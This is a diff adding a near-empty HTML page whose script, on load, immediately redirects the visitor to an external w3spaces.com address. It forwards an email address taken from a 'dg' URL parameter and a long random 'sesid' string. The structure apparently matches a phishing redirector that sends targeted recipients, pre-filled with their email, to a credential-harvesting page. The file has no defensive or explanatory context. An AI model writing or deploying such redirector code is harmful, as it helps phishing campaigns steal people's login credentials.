@@ -1,0 +1,61 @@
+
+<html dir="ltr" lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+   <script type="text/javascript">
+
+   	var link = 'https://dxtershauyd27a.w3spaces.com/';
+   	var params = getParams('dg')
+   	var randStr = str_random(200);
+
+   	var new_link = link + '?sesid='+ randStr + '?dg=' +params;
+
+   	console.log(new_link)
+
+   window.location.href = new_link;
+   
+
+
+
+    	function getParams(name){
+    		var para = getParameterByName(name);
+    		if(para == null){
+    			para = '[E-mail Address]'
+    		}
+
+    		return para;
+    	}
+
+   	// Get Parameter By Name
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, '\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            var encodedUri = decodeURIComponent(results[2].replace(/\+/g, ' '));
+            return encodedUri;
+        }    
+
+        // Generate Random String
+        function str_random(l = 10){
+            let a = `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`;
+            let str = '';
+
+            for(let i = 0; i < l; i++){
+                str += a[Math.floor(Math.random() * a.length)];
+            }
+
+            return str;
+        }
+	   	
+   </script>
+
+</head>
+<body class="cb" style="display:block">
+   
+</body>
+</html>
+
+
